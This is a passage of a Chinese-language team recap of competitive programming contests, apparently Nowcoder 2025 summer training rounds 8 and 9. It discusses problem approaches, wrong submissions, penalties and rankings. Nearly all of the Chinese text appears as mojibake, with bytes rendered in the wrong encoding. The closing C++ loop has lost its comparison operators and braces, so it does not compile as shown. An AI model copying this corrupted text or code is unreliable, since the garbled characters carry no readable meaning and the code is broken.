ã€Scyã€‘å•Šå‘€ï¼Œå¿˜è®°å¼€ long long äº†ï¼ $\\texttt{12:39:44}$ ç¬¬äºŒå‘æäº¤ï¼ŒWAï¼ ã€Scyã€‘å•Šå‘€ï¼Œå¿˜è®°å–æ¨¡äº†ï¼ $\\texttt{12:41:49}$ ç¬¬ä¸‰å‘æäº¤ï¼ŒACï¼ ã€Scyã€‘æˆ‘æ˜¯ç½ªäººï¼å‘œå‘œå‘œå‘œâ€¦â€¦ å¥½å§ï¼Œèµ›åä»”ç»†æƒ³äº†ä¸€ä¸‹ï¼Œå¥½åƒè¿˜æ˜¯æŒºå¥½è¯æ˜çš„ï¼ ã€Skyã€‘G çš„é¢˜ç›®å¤§æ„ï¼šç»™å®šå¶æ•° $n$ï¼Œæ„é€  $\\{1, 2, \\cdots, n\\}$ çš„å­é›† $S$ ä½¿å¾—å¤§å°ä¸º $\\frac{n}{2}$ ä¸” $\\forall x, y, z \\in S$ï¼ˆå¯ä»¥ç›¸ç­‰ï¼‰ï¼Œ$xyz$ ä¸æ˜¯å®Œå…¨å¹³æ–¹æ•°ã€‚ è§‚å¯Ÿåˆ°å®Œå…¨å¹³æ–¹æ•°ä¸€å®šæ˜¯ $a^{2k}, k \\in \\mathbb{N}$ï¼Œé‚£ä¹ˆå°è¯•å»æ„é€ ä¸€äº›è´¨å› æ•°æ¬¡æ–¹å’Œå…¨æ˜¯å¥‡æ•°çš„æ•°ï¼Œè¿™æ ·ä»»é€‰ä¸‰ä¸ªä¹˜èµ·æ¥ä¹Ÿéƒ½æ˜¯å¥‡æ•°æ¬¡æ–¹ï¼Œå°±ä¸ä¼šæ˜¯å®Œå…¨å¹³æ–¹æ•°ã€‚ è€ƒè™‘å…ˆæå–æ‰€æœ‰è´¨æ•°ï¼Œæ ‡è®°ä¸º $\\text{true}$ï¼Œæ¬¡æ–¹éƒ½ä¸º $1$ï¼Œç„¶åå› ä¸ºé¢˜ç›®ç»™äº†èŒƒå›´æ˜¯ $2 \\leq n \\leq 10^6$ï¼Œå¯ä»¥éå†åš $O(n)$ ç®—æ³•ã€‚è®°å½•ä¸€ä¸ª $\\text{ans}$ åŠ¨æ€æ•°ç»„ï¼Œä» $2$ å¼€å§‹ï¼Œå¦‚æœæ›¾ç»è¢«æ ‡è®°ä¸º $\\text{true}$ï¼Œç›´æ¥åŠ å…¥ $\\text{ans}$ï¼Œå¹¶å°†å…¶å›ºå®šï¼Œå³è‡³å°‘é€‰è¿™ä¸€ä¸ªè´¨æ•°ï¼Œå‰©ä¸‹çš„ä¸¤ä¸ªæ•°ä»ç°æœ‰çš„ $\\text{ans}$ é‡Œé¢éšä¾¿é€‰ï¼ˆå¯ç›¸åŒï¼‰ï¼Œä¹˜èµ·æ¥å¹¶æ ‡è®°ä¸º $\\text{true}$ï¼Œè¿™æ ·å°±èƒ½ç”Ÿæˆä¸€ä¸ªè´¨å› æ•°æ¬¡æ–¹å’Œå…¨æ˜¯å¥‡æ•°çš„æ•°åˆ—ã€‚ æ•´ä½“ç†è®ºå¤æ‚åº¦æ˜¯ $O(n^3)$ ï¼Œä½†æ˜¯ $\\text{ans}$ å…·æœ‰å•è°ƒæ€§ï¼Œåœ¨éå†è¿‡ç¨‹ä¸­å¯ä»¥æœ‰ä¹˜ç§¯ $\\geq 10^6$ ç›´æ¥å‰ªæï¼Œæ‰€ä»¥æœ€åå®é™…ä¸Šå¤§æ¦‚åªä¼šè·‘åˆ° $O(n)$ï¼Œé¢„å¤„ç† $\\text{ans}$ ç„¶åè¾“å‡ºå³å¯ã€‚ Scy å¼€å§‹ä»¥ä¸ºæ—¶é—´å¤æ‚åº¦ä¼šçˆ†ï¼Œä½†æ˜¯æµ‹äº†ä¸€ä¸‹è·‘å¾—å¼‚å¸¸å¿«ï¼Œä¸€å‘ ACï¼ï¼ˆScy åœ¨åˆ©ç”¨ $x^2 \\equiv 2 \\pmod 3$ ä¸å­˜åœ¨çš„æ€§è´¨ä¹±æï¼Œè¿˜æ²¡å¼„å‡ºæ¥å°±è¢« Sky åˆ‡æ‰äº†%%%ï¼‰ï¼‰ ã€Zlwã€‘åˆçœ‹ J æƒ³åˆ°æœ‰æ•ˆçš„è´¨å› æ•°ä¸ªæ•°æ˜¯ $O(\\log w)$ ä½†æ˜¯æ¯”è¾ƒéš¾åˆ†è§£è´¨å› æ•°ï¼Œäºæ˜¯æƒ³åˆ°æ˜¯å¦å¯ä»¥ç”¨ç ´è…Šè‚‰ï¼Œäºæ˜¯æŠ„äº†ä¸€ä¸ªæ¿å­ï¼Œç„¶åä¿®æ”¹ä¸€ä¸‹å‘ç° TLE äº†ï¼Œåœ¨å¡å¸¸è·¯ä¸Šä¸€å»ä¸å¤è¿”ã€‚ç›´åˆ°æŸä¸€åˆ»ç»è¿‡ Sky çš„æé†’ï¼Œå‘ç°è²Œä¼¼å¯ä»¥é€šè¿‡ $\\min\\{ \\frac{\\max\\{a,c\\}}{\\gcd(a,c)},\\gcd(a,c)\\}\\leq 10^9$ï¼Œç„¶åæ€è€ƒæ˜¯å¦æœ‰åˆ†ç±»è®¨è®ºå¹³è¡¡å¤æ‚åº¦çš„è¯´æ³•ã€‚åœ¨æ¨å¼å­çš„è¿‡ç¨‹ä¸­å‘ç°ï¼š $\\gcd(x^bG^b,y^dG^d)=G^{d}\\gcd(x^bG^{b-d},y^d)$ ï¼Œå‘ç° $\\gcd(x,y)=1\\rightarrow \\gcd(x^bG^{b-d},y^d)=\\gcd(G^{b-d},y^d)$ï¼Œäºæ˜¯å¾—åˆ°ä¸€ä¸ªå¯ä»¥è¾—è½¬çš„å¼å­ï¼Œè¯•äº†ä¸€ä¸‹å‘ç°å¯ä»¥è¿‡ï¼Œç„¶ååˆå‘ç°ç”±äºåº•æ•°æ¯æ¬¡éƒ½é™¤æ‰ä¸€ä¸ªå¤§äº 1 çš„æ•°ï¼Œæ‰€ä»¥å¤æ‚åº¦æ˜¯ $O(\\log w)$ï¼Œå†ä¹˜ä¸Šè®¡ç®— $\\gcd$ çš„å¤æ‚åº¦æ€»å¤æ‚åº¦ $O(T\\log^2 w)$ äºæ˜¯é€šè¿‡ã€‚ ã€Sky Scyã€‘Sky å…ˆå°è¯•äº†è¿™é“é¢˜ã€‚A æ˜¯ä¸€é“éå¸¸ç¥ç§˜é¢˜ï¼ŒAlice å¯ä»¥æ—‹è½¬ $4 \\times 4$ çš„çŸ©é˜µï¼ŒBob åˆ™æ˜¯çº¯éšæœºã€‚æˆ‘å…ˆå†™äº†ä¸ªæš´åŠ›æƒ³æ‰¾è§„å¾‹ï¼Œä½†æ˜¯å¯èƒ½è§’åº¦ä¸å¤ªå¯¹ï¼Œå› ä¸ºæˆ‘å‘ç°å·¦ä¸Šè§’çš„ $1$ åœ¨ Alice æ—‹è½¬æ— é™æ¬¡æ•°ä¹‹ååˆ°ä»»æ„ä¸€ä¸ªä½ç½®çš„æ¦‚ç‡æ˜¯ç›¸ç­‰çš„ï¼Œé‚£ Alice éš¾é“ä¹Ÿæ˜¯ç”Ÿæˆçš„éšæœºçŸ©é˜µå—ï¼Ÿ å…¶å®ä¸ç„¶ã€‚è¿™æ—¶å€™å­™âœŒæé†’æˆ‘ï¼Œå…¶å®æ˜¯ä¸€ä¸ªæ¡ä»¶æ¦‚ç‡é—®é¢˜ï¼Œä¸èƒ½å•ç‹¬æ‹¿å‡ºæ¯ä¸€ä¸ªæ•°æ¥ç®—æ¦‚ç‡,è¦æ‰¾ç›¸å¯¹å…³ç³»ã€‚ ç„¶å Scy å¼€å§‹å°è¯•ä¹±æã€‚æƒ³ç€å°±æ˜¯æ—‹è½¬ä¼šå‡ºç°ä»€ä¹ˆæ€§è´¨ï¼Œä½¿å¾—åªæœ‰ Alice çš„æ—‹è½¬æ˜¯ä¸ä¼šå˜çš„ã€‚çŒœäº†å‡ ä¸ªä¸œè¥¿ç„¶åçŒœåˆ°é€†åºå¯¹ã€‚è€ƒè™‘åˆ°è¡Œå’Œåˆ—éƒ½åœ¨å˜åŒ–ï¼Œæ‰€ä»¥çŒœæµ‹æ•´ä¸€ä¸ªæ•°ç»„çš„é€†åºå¯¹ã€‚ç”¨ Sky å†™çš„æš´åŠ›è¾“å‡ºäº†ä¸€ä¸‹é€†åºå¯¹çš„æƒ…å†µï¼ŒæƒŠè®¶åœ°å‘ç°éƒ½æ˜¯å¶æ•°ï¼Œäºæ˜¯æœæ–­å†™ç„¶åæäº¤ï¼Œé€šè¿‡äº†ï¼ ã€Zlw Scyã€‘å°è¯•æ¨äº† I é¢˜ï¼Œå¾ˆæ˜¾ç„¶æ˜¯ä¸€ä¸ªçŸ©é˜µå¿«é€Ÿå¹‚çš„ä¼˜åŒ–é¢˜ã€‚ä½†æ˜¯ç®—æ¦‚ç‡å¹¶ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“ï¼ŒScy å’Œ Zlw çš„å¼å­å‡æ²¡æœ‰é€šè¿‡æš´åŠ›ã€‚ç”±äºæ—¶é—´ä¸è¶³ï¼Œæœ€åå¹¶æ²¡æœ‰æ¢å‡ºæ­£è§£ã€‚ï¼ˆåº”è¯¥å¾€æ–¹æ¡ˆæ•°ç»Ÿè®¡çš„æ–¹å‘ä¸Šé ï¼Œä»è€Œè¿›ä¸€æ­¥åœ°å¾—åˆ°æœŸæœ›ï¼‰ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥8 ã€çœæµç‰ˆã€‘è¿™ä¸€å‘¨æ™®éæ‰“å¾—éƒ½ä¸æ˜¯å¾ˆç†æƒ³ï¼Œæœ‰é¢˜ç›®æƒ³åæ— æ³•æ‹‰å›å¯¼è‡´å¤§æ–¹å‘æŠŠæ§ä¸ä½³ã€‚$5/11$ é¢˜ï¼Œ$\\texttt{rank 220/1490}$ã€‚ ã€Zlwã€‘A æ˜¯ç­¾åˆ°é¢˜ï¼Œå¾ˆç®€å•çš„æšä¸¾ï¼Œç¨å¾®å†™å†™ç»†èŠ‚è¿‡äº†ã€‚ ã€Scyã€‘ C ä¹Ÿæ˜¯ç­¾åˆ°ï¼Œç»“åˆç‰©ç†æ¨¡å‹åˆ†æï¼Œå¹³æŠ›è·¯ç¨‹çš„ $x$ æ˜¯å…³äº $H$ çš„ä¸Šå‡¸å‡½æ•°ï¼Œç›´æ¥å…³äºå¯¹ç§°è½´çš„è·ç¦»æ’åºå³å¯ã€‚ ã€Scyã€‘ä»–ä¿©åœ¨çœ‹ Jï¼Œæˆ‘å…ˆçœ‹äº† Fã€‚é¦–å…ˆå…ˆé¢„å¤„ç†å‡ºäº†æ¯ä¸€ä¸ªç¯ç®¡æœ‰å“ªäº›æ•°å­—æ˜¯äº®çš„ï¼Œç„¶åå¯¹äºæ¯ä¸€ä½è®¾çŠ¶æ€ï¼Œçœ‹å“ªäº›ç¯ç®¡äº®èµ·æ—¶å¯ä»¥è¦†ç›–æ‰€æœ‰çš„æƒ…å†µã€‚éšä¾¿å†™äº†ä¸€ä¸‹å°±è¿‡æ ·ä¾‹ï¼Œäº¤äº†ä»¥å WAã€‚æ‰‹æ¨¡äº†å‡ ä¸ªå‘ç°å½¢å¦‚ $\\texttt{012}$ ä¸ $\\texttt{234}$ è¿™ç§æ•°ä½ä¸èƒ½ç‹¬ç«‹å»çœ‹ï¼Œå› ä¸ºè¿™ç»„æ•°æ®åªéœ€è¦ä¸€ä¸ªç¯ç®¡å³å¯åŒºåˆ†ï¼Œä¹Ÿå°±æ˜¯ $2^{7m}$ çš„çŠ¶æ€ï¼Œç›´æ¥çŠ¶å‹è‚¯å®šè¶…æ—¶ï¼Œäºæ˜¯å…ˆæ²¡æœ‰ç»§ç»­å†™ä¸‹å»ã€‚ ã€Skyã€‘J é¢˜ç›®ç»™äº†ä¸€ä¸ª $\\sqrt{-2}$ è¿›åˆ¶çš„å®šä¹‰ï¼Œè®©ä½ å»ç®—ä¸¤ä¸ªæ•°åœ¨ $\\sqrt{-2}$ è¿›åˆ¶ä¸‹çš„ä¹˜æ³•ã€‚ è€ƒè™‘åˆ°æ•°æ®èŒƒå›´å¾ˆå¤§ï¼Œ $\\sum{(|A| + |B|)} \\leq 2 \\times 10^6$ ï¼Œå³ä½¿æ˜¯ç®€å•çš„ä¹˜æ³•ä¹Ÿéœ€è¦ $O(|A| \\cdot |B|)$ ï¼Œä¸èƒ½å†æ—¶é—´èŒƒå›´å†…é€šè¿‡ã€‚ è§‚å¯Ÿåˆ° $A \\times B$ åœ¨ $\\sqrt{-2}$ è¿›åˆ¶ä¸‹çš„ä¹˜æ³•å…¶å®å°±æ˜¯ï¼š a_1 (\\sqrt{-2})^0 + a_2 (\\sqrt{-2})^1 + \\cdots + a_n (\\sqrt{-2})^{n-1}ä¹˜ä¸Š b_1 (\\sqrt{-2})^0 + b_2 (\\sqrt{-2})^1 + \\cdots + b_m (\\sqrt{-2})^{m-1}å¿«é€Ÿå¤šé¡¹å¼ç›¸ä¹˜ï¼Œè€ƒè™‘ FFTã€‚ ç°åœºå»æ‰¾äº†ä¸ªæ¿å­ï¼Œä¹˜å®Œä¹‹åå†åš $\\sqrt{-2}$ è¿›åˆ¶ä¸‹çš„è¿›ä½å¤„ç†ï¼Œç®€å•æ¨¡æ‹Ÿä¸€ä¸‹å°±è¿‡äº†ã€‚ é¢˜ç›®å…¶å®æ€è·¯ä¸ç®—éš¾ï¼Œä½†ä¸€å¼€å§‹ä¸€ç›´åœ¨æƒ³ä¸ç”¨ FFT çš„åšæ³•ï¼Œæµªè´¹äº†äº›æ—¶é—´ï¼Œä¹Ÿæƒ³ä¸åˆ°ï¼Œå°±ç›´æ¥ä¸Šæœºå†™äº†ã€‚ ã€Scyã€‘$\\color{red}\\large{æ³¨æ„åˆ° \\texttt{ Sky } å¿˜è®°å¤šç»„æ•°æ®æ¸…ç©ºä»¥åŠç”¨ \\texttt{ memset } è´¡çŒ®äº†ä¸¤å‘ç½šæ—¶ï¼ï¼ï¼}$ ã€Zlwã€‘B å¾ˆå¿«çš„å‘ç°åŒºé—´ shift åªæœ‰å½“è¿æ®µå˜åŠ¨çš„åŒºé—´é•¿åº¦éƒ½æ˜¯å¥‡æ•°æ‰ä¼šç¿»è½¬å¥‡å¶æ€§ï¼Œä½†æ˜¯ä¸€å¼€å§‹å®Œå…¨æ²¡æ³¨æ„åˆ°å®ƒçš„â€œæ•°æ®ç”Ÿæˆâ€è¿˜è—äº†ç»“è®ºã€‚ä»¥ä¸ºå¯ä»¥ç¡¬ç®—é€†åºå¯¹æ•°ï¼Œé™·å…¥äº†ç©ºé—´é™·é˜±é‡Œï¼Œæµ‹ç®—ä½¿ç”¨ $24\\rm B$ å­˜ä¸€ä¸ªæ•´æ•°å¯ä»¥æŠŠç©ºé—´å‹åˆ°çº¦ $30\\rm MB$ï¼Œæ‰‹æ¨¡äº†ä¸€ä¸ªå®æµ‹å‘ç°ç©ºé—´åœ¨ $\\rm [32MB,34MB]$ æ³¢åŠ¨ï¼Œéå¸¸ç‚¸è£‚ã€‚æ­¤æ—¶æµªè´¹äº†å¾ˆå¤šæ—¶é—´ï¼Œæ‰å¼€å§‹å»æƒ³äº¤æ¢æ˜¯å¦ä¹Ÿæœ‰æ€§è´¨ï¼Œç„¶åå‘ç°åªè¦ä¸æ˜¯ $i=f_i$ éƒ½ä¼šç¿»è½¬å¥‡å¶æ€§ï¼Œç„¶åå†™äº†å†™è¿‡äº†ã€‚$\\color{red}\\large{æµªè´¹äº†å¾ˆå¤šæ—¶é—´åœ¨éæ­£è§£å¡ç©ºé—´ä¸Š}$ã€‚ ã€Scyã€‘åˆ°å¾ˆåé¢æ‰ç»§ç»­æ€è€ƒ Fï¼Œå‘ç°æœ‰æ•ˆçš„çŠ¶æ€ä¼¼ä¹å¹¶ä¸å¤šï¼Œè€Œä¸”ç­”æ¡ˆæœ€å¤§ä¹Ÿå°±æ˜¯ $7m$ã€‚äºæ˜¯å°è¯•å‰ªææœç´¢ï¼Œè®°å½•ä¸‹ä¸€ä¸ªæ•° $i$ å—åˆ°å½±å“çš„ç¯ç®¡çŠ¶æ€ $S_i$ï¼Œå¦‚æœè¦åŒºåˆ«ä¸¤ä¸ªæ•°å­—ï¼Œåˆ™æœ€ç»ˆç­”æ¡ˆçš„çŠ¶æ€ $T$ æ»¡è¶³ $(T \\ (S_i \\oplus S_j)) eq 0$ å³å¯ã€‚å¦å¤–è¿˜åŠ äº†ä¸€ä¸ª $S_i \\oplus S_j$ çš„å»é‡å’Œç­”æ¡ˆçš„æœ€ä¼˜æ€§å‰ªæã€‚æµ‹äº†ä¸€ä¸‹æé™æ•°æ®ï¼Œå‘ç°è·‘å¾—å¾ˆå¿«ï¼Œæäº¤é€šè¿‡ã€‚å“æœ¬æ¥ç¬¬ä¸€å‘æäº¤æ˜¯ $00:45$ï¼Œå†å¤šæ€è€ƒåå‡ åˆ†é’Ÿå°±èƒ½é€šè¿‡ï¼Œç°åœ¨å¢åŠ ä¸¤ä¸ªå¤šå°æ—¶çš„ç½šæ—¶ã€‚ ã€Zlw Sky Scyã€‘ä¸€å¼€å§‹ Sky å’Œ Scy åœ¨è®¨è®ºè¿™é“ Gã€‚Sky å‘ç°å½“ä¸¤ç‚¹é—´åŸæ¥ä¸ç›¸è¿æ—¶ï¼Œè´¡çŒ®ä¸ºè·¯å¾„ä¸Šæœ€å¤§å€¼ $-1$ï¼Œä½†æ˜¯ $O(n^2)$ ä¸”æ²¡è€ƒè™‘å¤šä¸ªæœ€å°ç”Ÿæˆæ ‘çš„æ¸…ç©ºã€‚Zlw æ„Ÿè§‰æœ‰ç‚¹è¿·ï¼Œæ’äº†ä¸€å˜´è¯´æ˜¯å¯ä»¥ç”¨ Kruskal ç„¶ååŠ ç‚¹è®¡æ•°ã€‚Scy è®¤åŒäº†æˆ‘çš„åšæ³•ï¼Œç„¶åå†ç»è¿‡éªŒè¯æ²¡æœ‰å‘ç°ä»€ä¹ˆé—®é¢˜ï¼Œäºæ˜¯æˆ‘ä¸Šæœºå¼€å†™ã€‚ä½†æ˜¯åé¢å‘ç°æƒ³è¦å»æ‰ä¸€æ¡æ— æ•ˆè¾¹çš„è´¡çŒ®è¿˜éœ€è¦çŸ¥é“è¿™æ¡è¾¹æœ€å…ˆè¢«åˆ é™¤çš„æ—¶é—´ã€‚æˆ‘å¾ˆå¿«æœ‰äº†ä¸€ä¸ªäºŒåˆ†+å¯æŒä¹…åŒ–å¹¶æŸ¥é›†çš„æƒ³æ³•ï¼Œä½†æ˜¯ $3$ ä¸ª $\\log$ ä¸”ç‰¹åˆ«éº»çƒ¦è¢« Scy éª‚äº†ã€‚å‘ç°å¯ä»¥ç¦»çº¿ï¼Œäºæ˜¯æå‡ºæ•´ä½“äºŒåˆ†ï¼Œæ­¤æ—¶ Scy è¿˜æ²¡æœ‰å…¶å®ƒæ€è·¯ï¼Œäºæ˜¯æˆ‘å…ˆå†™äº†ã€‚å†ç»“æŸå‰ 5min å†™å®Œï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªåœ°æ–¹æ²¡æœ‰å¼€ long longï¼Œè¿˜æœ‰ä¸€ä¸ªåœ°æ–¹æ²¡åˆ¤ $m=0$ æ­»å¾ªç¯äº†èµ›åè¿˜è°ƒäº†ä¸€å¹´ã€‚ èµ›å Scy ç”¨å¦å¤–ä¸€ä¸ªå• $\\log$ ç®—æ³•é€šè¿‡äº†ã€‚å°±æ˜¯æŒ‰ç…§ä¹‹å‰çš„æ€è·¯ å°±æ˜¯å…ˆä¸å‡å»é‚£äº›åŸæ¥æœ‰çš„è¾¹çš„è´¡çŒ®ï¼Œå³ $(w_i - 1) \\times sz_x \\times sz_y$ï¼Œç„¶åä¹‹åæŒ‰ç…§ Sky çš„æ€è·¯ï¼Œçœ‹åŸæ¥å°±æœ‰çš„è¾¹ $(u,v)$ æ˜¯å¤šç®—çš„å€¼ï¼Œæ˜¾ç„¶å°±æ˜¯æœ€å°ç”Ÿæˆæ ‘ä¸Šè¿™æ¡è·¯å¾„çš„ $\\max - 1$ã€‚å…ˆç”¨ Kruskal åç”¨æ ‘ä¸Šå€å¢ç»´æŠ¤æœ€å¤§å€¼å³å¯ã€‚è¿˜å› ä¸ºæ”¾é”™å€å¢ä½ç½®å¯¼è‡´ WA äº†å¾ˆä¹…ã€‚ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥9 ã€çœæµç‰ˆã€‘ç»§ç»­å æœºï¼ŒG é¢˜ 300 å¤šçš„è¿‡é¢˜æ•°ä½†æ˜¯åšä¸å‡ºï¼Œæœ€åä¸¤å°æ—¶è½¬æˆ˜ B ä½†æ— åŠ›å›å¤©ã€‚ä»¥åŠï¼Œæ¦œå†æ¬¡æ­ªï¼ŒB é¢˜è§£é‡Œå†™çš„æ˜¯ hardã€‚$5/13$ é¢˜ï¼Œ$\\texttt{rank 378/1458}$ã€‚ ã€Zlwã€‘M å¼€å±€ä¸€åˆ†é’Ÿå°±æœ‰äººé€šè¿‡ï¼Œäºæ˜¯å†™äº†ä¸ªæš´åŠ›å‘ç° $n9$ æ— è§£ï¼Œäº¤ä¸Šå»è¿‡äº†ã€‚ ã€Skyã€‘J æ˜¯ç­¾åˆ°é¢˜ï¼Œè¯»äº†å¥½å‡ éæ‰æ•¢å†™ï¼Œæ¯è¡Œåé¢åŠ ä¸ª nya å³å¯ã€‚çŒ«å¨˜å¯çˆ±ã€‚ ã€Scyã€‘L è¯»äº†ä¼šå„¿é¢˜ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¯åšçš„ã€‚è¿˜æ²¡ä»”ç»†æƒ³å°±è¢« Zlw ä½¬å«å»ä¸€èµ·çœ‹ Fã€‚F ä¸€çœ‹å°±æ˜¯ $O(1)$ ç»“è®ºé¢˜ï¼Œå’Œ Zlw è®¨è®ºäº†ä¸€ä¼šå„¿è®¤ä¸ºè¦ç–¯ç‹‚åˆ†ç±»è®¨è®ºã€‚åœ¨è‰ç¨¿çº¸ä¸Šç”»äº†ä¸€ä¼šå„¿ï¼Œä½†è¶Šåˆ†è¶Šä¹±ï¼Œè¿Ÿè¿Ÿæ— æ³•ä¸Šæœºã€‚ ä¹‹åæƒ³ç€æ—‹è½¬ä¼šå¯¼è‡´æ›¼å“ˆé¡¿è·ç¦»çš„ $|\\Delta| = 1$ï¼Œå› æ­¤åªéœ€è¦ç»ˆç‚¹ä¸¤ä¸ªåæ ‡çš„ $x,y$ ä¹‹å’Œä¸èµ·ç‚¹çš„åæ ‡ä½œå·®ï¼Œåå– $\\max$ å³å¯ï¼ˆå…¶å®å°±ç›¸å½“äºé¢˜è§£é‡Œçš„æ—‹è½¬æ“ä½œï¼‰ã€‚ä¸€å‘ WAï¼Œå‘ç°å¿˜è®°å¼€ long long äº†ï¼Œä¿®æ”¹åæäº¤é€šè¿‡ã€‚ ã€Zlw Skyã€‘Zlw æœ¬æ¥å…ˆçœ‹äº† G æ²¡ä»€ä¹ˆæ€è·¯ï¼Œç„¶å Sky åœ¨çœ‹ Aï¼Œçœ‹äº†ä¸€ä¸‹å‘ç°å¦‚æœè¦åŠ ç‚¹ï¼Œæ“ä½œæ•°å¢é•¿çš„å¾ˆå¿«ã€‚ç„¶åç”»äº†ä¸€ä¸‹å›¾æ‰¾äº†ä¼šè§„å¾‹ï¼Œæ‰¾åˆ°äº†ä¸€ä¸ªé”™è¯¯çš„è§„å¾‹ï¼ˆæ²¡æƒ³ç€å»ä¸¥è°¨æ¨ï¼Œæ˜¯ä¸ªè´¥ç¬”ï¼‰ï¼Œä»¥ä¸ºæ˜¯æŒ‰ç…§æ ¹å·å¢é•¿çš„ã€‚ç„¶åå¿å¿‘çš„å†™äº†ä¸€ä¸ªæ ¹å·çš„ dpï¼Œäº¤ä¸Šå» WA äº†ï¼ŒåˆæŸ¥äº†å¥½å‡ ä¸ªæ ·ä¾‹æ‰å‘ç°åŠ ç‚¹çš„å¼å­æ¨é”™äº†ï¼Œä¸¥è°¨åœ°å†™æˆäº† $f_i=f_{i-1}+f_{i-2}+1$ï¼Œè¿™å›æ­£ç¡®æ€§æ²¡é—®é¢˜äº†ï¼Œä½†æ˜¯ä¸­é—´æœ‰ä¸ªåœ°æ–¹æ²¡æœ‰æŠŠæ ¹å·å±‚æ”¹æ‰ï¼Œåˆç½šå¤šäº†ä¸€æ¬¡æ—¶ã€‚ å…·ä½“æ¥è¯´ï¼Œè€ƒè™‘å°½é‡å»æ„é€ æ¯ä¸ªèŠ‚ç‚¹çš„ $|h_{ls_u} - h_{rs_u}| \\leq 1$ï¼Œå½¢æˆä¸€æ£µ AVL æ ‘ã€‚ è§‚å¯Ÿä¸Šé¢è¿™å¹…å›¾ï¼Œå¯ä»¥å‘ç° AVL æ ‘æ·±åº¦ä¸º $1$ çš„æ—¶å€™ï¼Œåªéœ€è¦è“è‰²ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ·±åº¦ä¸º $2$ çš„æ—¶å€™ï¼Œéœ€è¦è“è‰²å’Œæ©™è‰²ï¼Œæ·±åº¦ä¸º $3$ çš„æ—¶å€™éœ€è¦è“è‰²ã€æ©™è‰²å’Œç»¿è‰²ä¸€å…± $4$ ä¸ªèŠ‚ç‚¹ã€‚ä»¥æ­¤ç±»æ¨ï¼Œæˆ‘ä»¬è§‚å¯Ÿåˆ°ï¼ŒAVL æ ‘çš„æ·±åº¦å’Œæ‰€éœ€è¦çš„èŠ‚ç‚¹æœ‰å¾ˆå¼ºçš„å…³ç³»ã€‚å®é™…ä¸Šï¼Œå†æƒ³ä¸€æ­¥å°±å¯ä»¥å¾—åˆ°ï¼Œæƒ³è¦å½“å‰ AVL æ ‘çš„æ·±åº¦ $h_i$ åŠ  $1$ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨è¿™ä¸ªæ ‘çš„æ ¹èŠ‚ç‚¹ä¸Šé¢åŠ ä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ–°çš„æ ¹èŠ‚ç‚¹çš„å¦ä¸€ä¸ªå­æ ‘æ·±åº¦ä¸º $h_i-1$ å³å¯æ»¡è¶³ AVL æ ‘çš„æ¡ä»¶ã€‚ è¿™æ ·ä¸‹æ¥å‘ç°å…¶å®æ˜¯è¿‘ä¼¼æ–æ³¢é‚£å¥‘æ•°åˆ—ï¼Œæœ‰å¼å­ $f_i = f_{i-1} + f_{i-2} + 1$ ç„¶åå†ä»æ ¹èŠ‚ç‚¹ä»ä¸Šå¾€ä¸‹è·‘ä¸€ä¸ª dp å³å¯ï¼Œdp çš„éƒ¨åˆ†è¢« Zlw ä½¬ç§’äº†ï¼Œä½†æ˜¯ä½¬ä¸€å¼€å§‹æ•°åˆ—æé”™äº†ï¼Œçº æ­£å ACã€‚ ã€Scy Zlwã€‘æ‹¼å¥½é¢˜ã€‚å­åºåˆ—çš„ dpï¼Œç–‘ä¼¼ä»åé¢è®¡ç®—æ—¥æœŸçš„æ•°é‡ï¼Œç„¶åä»å‰é¢è®¡ç®—å¹´ä»½çš„æ•°é‡ã€‚ Zlw å…ˆæå‡ºå¯ä»¥å…ˆç”¨ $12 \\times 31 \\times n$ çš„æ—¶é—´ç®—å‡º $[i,n]$ å¼ºåˆ¶é€‰ $i$ æ—¶åˆæ³•æ—¥æœŸçš„æ•°é‡ã€‚è®¾ $f_{i,0/1/2/3,M,D}$ è¡¨ç¤ºè€ƒè™‘ $[i,n]$ æ—¶å¡«æœˆä¸æ—¥ä¸­çš„ç¬¬ $0/1/2/3$ ä½æ—¶ï¼Œæœˆä»½ä¸º $M$ï¼Œæ—¥æœŸä¸º $D$ï¼ŒåŒæ—¶å¼ºåˆ¶é€‰ $i$ æ—¶çš„åˆæ³•æ—¥æœŸæ•°é‡ã€‚æœ€åå‘ç°ä»£ç åœ¨å¾ˆå¤šç»†èŠ‚ä¸Šå‡ºäº†é—®é¢˜ï¼Œåˆè°ƒè¯•äº†å¥½ä¹…ã€‚ Scy å‘ç°å¯ä»¥ç”¨ $O(n)$ çš„æ—¶é—´ç®—å‡º $[1,i]$ ä¸­åˆæ³•çš„é—°å¹´çš„æ•°é‡ã€‚ä¸»è¦éœ€è¦è€ƒè™‘çš„æ˜¯è¢« $100$ æ•´é™¤çš„æƒ…å†µã€‚è®¾ $one_{i,j},two_{i,j}$ è¡¨ç¤ºç¬¬ $i$ ä½ä¸º $j$ï¼Œä½œä¸ºå¹´ä»½çš„åƒ/ç™¾ä½æ—¶çš„æ•°é‡ï¼Œå‡ä¸º $0$ æ—¶æ³¨æ„ç‰¹åˆ¤ä¸åˆæ³•ã€‚ç›´æ¥ç±»ä¼¼å‰ç¼€å’Œçš„æ€æƒ³ä¸€ä½ä¸€ä½çš„æ¨è¿‡æ¥ï¼Œç„¶åè®¡æ•°ã€‚ for (int i = 1;i = n;++i) pre[i] = pre[i - 1]; if (!a[i]) pre[i] = (pre[i] + third) % MOD; for (int o = 0;o 10;++o) third = (third + two[o]) % MOD; if (a[i] % 4 == 0) two[a[i]] += (one[0] + one[2] + one[4] + one[6] + one[8]) % MOD; two[a[i]] %= MOD; if (!a[i]) two[a[i]] = (two[a[i]] - one[0] + MOD) % MOD; if (a[i] % 4 == 2) two[a[i]] += (one[1] + one[3] + one[5] + one[7] + one[9]) % MOD; two[a[i]] %= MOD; ++one[a[i]]; ã€*ã€‘ç”±äº G ä¸‰äººéƒ½æ— æƒ³æ³•ï¼Œæœ€åé—æ†¾äº”é¢˜ç¦»åœºã€‚æœ¬æ¥æ˜¯å¯èƒ½æœ‰æ—¶é—´å†™åˆ«çš„é¢˜çš„ï¼Œä½†æ˜¯æœ‰äººä¸ä¼šåˆ¤æ–­é—°å¹´ï¼ŒæŠŠæš´åŠ›ä»£ç 